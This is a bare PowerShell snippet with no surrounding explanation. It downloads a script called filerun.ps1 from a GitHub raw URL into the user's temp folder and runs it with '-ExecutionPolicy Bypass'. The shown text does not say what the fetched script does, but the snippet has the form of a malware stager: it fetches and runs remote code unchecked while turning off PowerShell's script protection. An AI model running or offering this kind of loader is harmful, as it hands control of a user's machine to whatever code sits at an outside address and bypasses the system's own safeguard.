$scriptUrl = "https://github.com/KevinDark5/data/raw/refs/heads/main/filerun.ps1"
$tempFile = "$env:TEMP\filerun.ps1"

Invoke-WebRequest -Uri $scriptUrl -OutFile $tempFile
PowerShell -ExecutionPolicy Bypass -File $tempFile
